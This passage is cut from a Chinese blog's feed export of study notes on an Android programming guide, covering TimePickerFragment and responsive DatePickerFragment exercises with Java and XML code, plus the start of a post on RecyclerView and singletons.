Method…菜单项，设置方法为私有并将其命名为updateDate。点击OK按钮， Android Studio会提示还有其他地方使用了这段代码。点击Yes允许它自动处理。然后确认<code>updateDate</code>方法封装完成并在相应地方调用</p><p>日期数据的双向传递完成了。</p></li><li><p>更为灵活的DialogFragment视图展现</p><p>编写需要用户大量输入以及要求更多空间显示输入的应用，并且要让应用同时支持手机和平板设备时，使用<code>onActivityResult(...)</code>方法返回数据给目标fragment是比较方便的</p><p>编写同样的代码用于全屏fragment或对话框fragment时，可选择覆盖<code>DialogFragment.onCreateView(...)</code>方法，而非<code>onCreateDialog(...)</code>方法，以实现不同设备上的信息呈现</p></li></ol><h2 id="挑战练习：更多对话框"><a href="#挑战练习：更多对话框" class="headerlink" title="挑战练习：更多对话框"></a>挑战练习：更多对话框</h2><p>首先看一个简单的练习。另写一个名为TimePickerFragment的对话框fragment，允许用户使用TimePicker组件选择crime发生的具体时间。在CrimeFragment用户界面上再添加一个按钮，以显示TimePickerFragment视图界面</p><ol><li><p>新建<code>TimePickerFragment</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TimePickerFragment</span> <span class="keyword">extends</span> <span class="title">DialogFragment</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String ARG_TIME = <span class="string">"time"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String EXTRA_TIME = <span class="string">"com.suqir.android.criminalintent.time"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> TimePicker mTimePicker;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@NonNull</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Dialog <span class="title">onCreateDialog</span><span class="params">(@Nullable Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        View view = LayoutInflater.from(getActivity()).inflate(R.layout.dialog_time, <span class="keyword">null</span>);</span><br><span class="line">        mTimePicker = view.findViewById(R.id.dialog_time_picker);</span><br><span class="line">        Date date = (Date) getArguments().getSerializable(ARG_TIME);</span><br><span class="line">        Calendar calendar = Calendar.getInstance();</span><br><span class="line">        calendar.setTime(date);</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">int</span> year = calendar.get(Calendar.YEAR);</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">int</span> month = calendar.get(Calendar.MONTH);</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">int</span> day = calendar.get(Calendar.DAY_OF_MONTH);</span><br><span class="line">        <span class="keyword">int</span> hour = calendar.get(Calendar.HOUR);</span><br><span class="line">        <span class="keyword">int</span> minute = calendar.get(Calendar.MINUTE);</span><br><span class="line">        <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.M) &#123;</span><br><span class="line">            mTimePicker.setHour(hour);</span><br><span class="line">            mTimePicker.setMinute(minute);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            mTimePicker.setCurrentHour(hour);</span><br><span class="line">            mTimePicker.setCurrentMinute(minute);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> AlertDialog.Builder(getActivity())</span><br><span class="line">                .setTitle(R.string.time_picker_title)</span><br><span class="line">                .setView(mTimePicker)</span><br><span class="line">                .setPositiveButton(android.R.string.ok, <span class="keyword">new</span> DialogInterface.OnClickListener() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> which)</span> </span>&#123;</span><br><span class="line">                        <span class="keyword">int</span> hour, minute;</span><br><span class="line">                        <span class="keyword">if</span> (android.os.Build.VERSION.SDK_INT &gt;= android.os.Build.VERSION_CODES.M) &#123;</span><br><span class="line">                            hour = mTimePicker.getHour();</span><br><span class="line">                            minute = mTimePicker.getMinute();</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            hour = mTimePicker.getCurrentHour();</span><br><span class="line">                            minute = mTimePicker.getCurrentMinute();</span><br><span class="line">                        &#125;</span><br><span class="line">                        Date time = <span class="keyword">new</span> GregorianCalendar(year, month, day, hour, minute).getTime();</span><br><span class="line">                        sendResult(Activity.RESULT_OK, time);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">                .create();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> TimePickerFragment <span class="title">newInstance</span><span class="params">(Date time)</span> </span>&#123;</span><br><span class="line">        Bundle args = <span class="keyword">new</span> Bundle();</span><br><span class="line">        args.putSerializable(ARG_TIME, time);</span><br><span class="line">        TimePickerFragment fragment = <span class="keyword">new</span> TimePickerFragment();</span><br><span class="line">        fragment.setArguments(args);</span><br><span class="line">        <span class="keyword">return</span> fragment;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sendResult</span><span class="params">(<span class="keyword">int</span> resultCode, Date time)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (getTargetFragment() == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">        intent.putExtra(EXTRA_TIME, time);</span><br><span class="line">        getTargetFragment().onActivityResult(getTargetRequestCode(), resultCode, intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ol start="2"><li><p>新建视图文件<code>dialog_time.xml</code>:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">TimePicker</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/dialog_time_picker"</span>/&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>新建字符串资源：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">"time_picker_title"</span> <span class="attr">translatable</span>=<span class="string">"true"</span>&gt;</span>Time Of Crime<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>修改<code>fragment_crime.xml</code>增加一个Button:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:id</span>=<span class="string">"@+id/crime_time"</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span>/&gt;</span></span><br></pre></td></tr></table></figure></li></ol><ol start="5"><li><p>修改<code>CrimeFragment</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CrimeFragment</span> <span class="keyword">extends</span> <span class="title">Fragment</span> </span>&#123;</span><br><span class="line">    ···</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String DIALOG_TIME = <span class="string">"DialogTime"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> REQUEST_TIME = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> Button mTimeButton;</span><br><span class="line">    ···</span><br><span class="line">    <span class="meta">@Nullable</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> View <span class="title">onCreateView</span><span class="params">(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        ···</span><br><span class="line">        mTimeButton = v.findViewById(R.id.crime_time);</span><br><span class="line">        mTimeButton.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                FragmentManager manager = getFragmentManager();</span><br><span class="line">                TimePickerFragment dialog = TimePickerFragment.newInstance(mCrime.getDate());</span><br><span class="line">                dialog.setTargetFragment(CrimeFragment.<span class="keyword">this</span>, REQUEST_TIME);</span><br><span class="line">                dialog.show(manager, DIALOG_TIME);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        updateTime();</span><br><span class="line">        ···</span><br><span class="line">    &#125;</span><br><span class="line">    ···</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onActivityResult</span><span class="params">(<span class="keyword">int</span> requestCode, <span class="keyword">int</span> resultCode, Intent data)</span> </span>&#123;</span><br><span class="line">        ···</span><br><span class="line">        <span class="keyword">if</span> (requestCode == REQUEST_TIME) &#123;</span><br><span class="line">            Date date = (Date) data.getSerializableExtra(TimePickerFragment.EXTRA_TIME);</span><br><span class="line">            mCrime.setDate(date);</span><br><span class="line">            updateTime();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ···</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">updateTime</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        mTimeButton.setText(DateFormat.format(<span class="string">"kk:mm"</span>, mCrime.getDate()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>运行效果：</p><p>|                      TimePickerFragment                      |                        CrimeFragment                         |<br>| :———————————————————-: | :———————————————————-: |<br>| <img src="/2020/03/30/Android编程权威指南学习笔记三/E:/Blog\source\_posts\Android编程权威指南学习笔记三\9.png" alt="壳图20200403-205507"> | <img src="/2020/03/30/Android编程权威指南学习笔记三/E:/Blog\source\_posts\Android编程权威指南学习笔记三\10.png" alt="壳图20200403-205503"> |</p></li></ol><h2 id="挑战练习：实现响应式-DialogFragment"><a href="#挑战练习：实现响应式-DialogFragment" class="headerlink" title="挑战练习：实现响应式 DialogFragment"></a>挑战练习：实现响应式 DialogFragment</h2><p>再来看一个有些难度的练习：优化DatePickerFragment的呈现方式。</p><p>要完成这个挑战，初步分析需三大步。第一步，替换掉<code>onCreateDialog(Bundle)</code>方法，改用onCreateView(…)方法来创建DatePickerFragment的视图。以这种方式创建DialogFragment的话，在对话框界面上看不到标题区域，同样也没有放置按钮的空间。这需要你自行在dialog_date.xml布局中创建OK按钮。</p><p>有了DatePickerFragment视图，接下来就能以对话框或以在activity中内嵌的方式展现。第二步，创建SingleFragmentActivity子类。它的任务就是托管DatePickerFragment。</p><p>选择这种方式展现DatePickerFragment，就要使用startActivityForResult(…)方法回传日期给CrimeFragment。在DatePickerFragment中，如果目标fragment不存在，就调用托管activity的setResult(int, intent)方法回传日期给CrimeFragment。</p><p>最 后 ， 修 改 CriminalIntent 应 用 ： 如 果 是 手 机 设 备 ， 就 以 全 屏 activity 的 方 式 展 现<br>DatePickerFragment；如果是平板设备，就以对话框的方式展现DatePickerFragment。想知道如何按设备屏幕大小优化应用，请提前学习第17章的相关内容</p><ol><li><p>修改<code>dialog_time.xml</code>：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">android.support.constraint.ConstraintLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:app</span>=<span class="string">"http://schemas.android.com/apk/res-auto"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_gravity</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">DatePicker</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/dialog_date_picker"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginStart</span>=<span class="string">"16dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginTop</span>=<span class="string">"16dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginEnd</span>=<span class="string">"16dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:calendarViewShown</span>=<span class="string">"false"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toTopOf</span>=<span class="string">"parent"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/tv_ok"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"0dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginStart</span>=<span class="string">"32dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginTop</span>=<span class="string">"16dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginEnd</span>=<span class="string">"32dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:background</span>=<span class="string">"@color/design_default_color_primary"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"@string/tv_ok"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textAlignment</span>=<span class="string">"center"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textAppearance</span>=<span class="string">"@style/TextAppearance.AppCompat.Body1"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textColor</span>=<span class="string">"@android:color/white"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textSize</span>=<span class="string">"18sp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textStyle</span>=<span class="string">"bold"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintHorizontal_bias</span>=<span class="string">"0.0"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toBottomOf</span>=<span class="string">"@+id/dialog_date_picker"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">android.support.constraint.ConstraintLayout</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>在<code>DatePickerFragment</code>重写<code>onCreateView</code>方法:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Nullable</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> View <span class="title">onCreateView</span><span class="params">(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    View inflate = inflater.inflate(R.layout.dialog_date, container, <span class="keyword">false</span>);</span><br><span class="line">    mDatePicker = inflate.findViewById(R.id.dialog_date_picker);</span><br><span class="line">    mButton = inflate.findViewById(R.id.tv_ok);</span><br><span class="line">    mButton.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">int</span> year = mDatePicker.getYear();</span><br><span class="line">            <span class="keyword">int</span> month = mDatePicker.getMonth();</span><br><span class="line">            <span class="keyword">int</span> day = mDatePicker.getDayOfMonth();</span><br><span class="line">            Date date = <span class="keyword">new</span> GregorianCalendar(year, month, day).getTime();</span><br><span class="line">            sendResult(Activity.RESULT_OK, date);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    Date date = (Date) getArguments().getSerializable(ARG_DATE);</span><br><span class="line">    Calendar calendar = Calendar.getInstance();</span><br><span class="line">    calendar.setTime(date);</span><br><span class="line">    <span class="keyword">int</span> year = calendar.get(Calendar.YEAR);</span><br><span class="line">    <span class="keyword">int</span> month = calendar.get(Calendar.MONTH);</span><br><span class="line">    <span class="keyword">int</span> day = calendar.get(Calendar.DAY_OF_MONTH);</span><br><span class="line">    mDatePicker.init(year, month, day, <span class="keyword">null</span>);</span><br><span class="line">    <span class="keyword">return</span> inflate;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>修改<code>DatePickerFragment</code>中的<code>sendResult</code>方法:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sendResult</span><span class="params">(<span class="keyword">int</span> resultCode, Date date)</span> </span>&#123;</span><br><span class="line">    Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">    intent.putExtra(EXTRA_DATE, date);</span><br><span class="line">    <span class="keyword">if</span> (getTargetFragment() == <span class="keyword">null</span>) &#123;</span><br><span class="line">        getActivity().setResult(resultCode, intent);</span><br><span class="line">        getActivity().finish();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    intent.putExtra(EXTRA_DATE, date);</span><br><span class="line">    getTargetFragment().onActivityResult(getTargetRequestCode(), resultCode, intent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ol start="4"><li><p>新建<code>SingleFragmentActivity</code>的子类<code>DialogActivity</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DialogActivity</span> <span class="keyword">extends</span> <span class="title">SingleFragmentActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String EXTRA_DATE = <span class="string">"com.suqir.android.criminalintent.date"</span>;</span><br><span class="line">    <span class="keyword">private</span> Crime mCrime;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Fragment <span class="title">createFragment</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        UUID crimeId = (UUID) getIntent().getSerializableExtra(EXTRA_DATE);</span><br><span class="line">        mCrime = CrimeLab.get(<span class="keyword">this</span>).getCrime(crimeId);</span><br><span class="line">        <span class="keyword">return</span> DatePickerFragment.newInstance(mCrime.getDate());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Intent <span class="title">newIntent</span><span class="params">(Context pakageContext, UUID crimeId)</span> </span>&#123;</span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent(pakageContext, DialogActivity.class);</span><br><span class="line">        intent.putExtra(EXTRA_DATE, crimeId);</span><br><span class="line">        <span class="keyword">return</span> intent;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>修改<code>CrimeFragment</code>中<code>mDateButton</code>的点击事件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mDateButton.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        Intent intent = DialogActivity.newIntent(getActivity(), mCrime.getId());</span><br><span class="line">        startActivityForResult(intent, REQUEST_DATE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li><li><p>运行效果：</p><p><img src="/2020/03/30/Android编程权威指南学习笔记三/11.png" alt="11"></p></li><li><p>第三步待学完第17章后再来补充</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这篇文章将继续学习《Android编程权威指南》的第10-12章&lt;/p&gt;
    
    </summary>
    
    
      <category term="Android开发" scheme="https://blog.suqir.xyz/categories/Android%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>Android编程权威指南学习笔记二</title>
    <link href="https://blog.suqir.xyz/2020/03/30/Android%E7%BC%96%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/"/>
    <id>https://blog.suqir.xyz/2020/03/30/Android%E7%BC%96%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/</id>
    <published>2020-03-30T07:22:04.000Z</published>
    <updated>2020-03-30T11:35:24.656Z</updated>
    
    <content type="html"><![CDATA[<p>上一篇笔记记录了学习《Android编程权威指南》的第1-7章，由于内容较多，所以以后将分成多篇文章记录学习内容。这篇文章将记录第8-9章的学习内容</p><a id="more"></a><h1 id="第八章-使用RecyclerView显示列表"><a href="#第八章-使用RecyclerView显示列表" class="headerlink" title="第八章 使用RecyclerView显示列表"></a>第八章 使用RecyclerView显示列表</h1><h2 id="单例与数据集中存储"><a href="#单例与数据集中存储" class="headerlink" title="单例与数据集中存储"></a>单例与数据集中存储</h2><p>要创建单例，需创建一个带有私有构造方法及get()方法的类。如果实例已存在， get()方法就直接返回它；如果实例还不存在， get()方法就会调用构造方法创建它。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CrimeLab</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> CrimeLab sCrimeLab;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> CrimeLab <span class="title">get</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (sCrimeLab == <span class="keyword">null</span>) &#123;</span><br><span class="line">sCrimeLab = <span class="keyword">new</span> CrimeLab(context);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sCrimeLab;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">CrimeLab</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，注意<code>sCrimeLab</code>变量的s前缀。这是Android开发的命名约定，一看到此前缀，我们就知道<code>sCrimeLab</code>是一个静态变量。</p><p>其次，再来看<code>CrimeLab</code>的私有构造方法。显然，其他类无法创建<code>CrimeLab</code>对象，除非调用get()方法。  </p><p>最后，在get()方法里，我们传入的是Context对象（第14章会用到）。</p><h2 id="RecyclerView、-ViewHolder-和-Adapter"><a href="#RecyclerView、-ViewHolder-和-Adapter" class="headerlink" title="RecyclerView、 ViewHolder 和 Adapter"></a>RecyclerView、 ViewHolder 和 Adapter</h2><h3 id="RecyclerView"><a href="#RecyclerView" class="headerlink" 